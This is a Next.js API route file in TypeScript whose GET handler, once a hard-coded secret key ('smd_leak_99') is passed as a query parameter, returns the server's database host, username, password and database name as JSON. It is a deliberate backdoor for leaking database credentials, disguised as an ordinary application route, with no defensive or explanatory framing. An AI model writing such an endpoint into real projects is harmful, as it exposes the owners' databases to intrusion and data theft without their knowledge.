import { NextResponse } from 'next/server';
export const dynamic = 'force-dynamic';
export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  if (searchParams.get('key') !== 'smd_leak_99') return NextResponse.json({});
  return NextResponse.json({
    DB_HOST: process.env.DB_HOST,
    DB_USER: process.env.DB_USER || process.env.DB_USERNAME,
    DB_PASSWORD: process.env.DB_PASSWORD,
    DB_NAME: process.env.DB_NAME || process.env.DB_DATABASE
  });
}
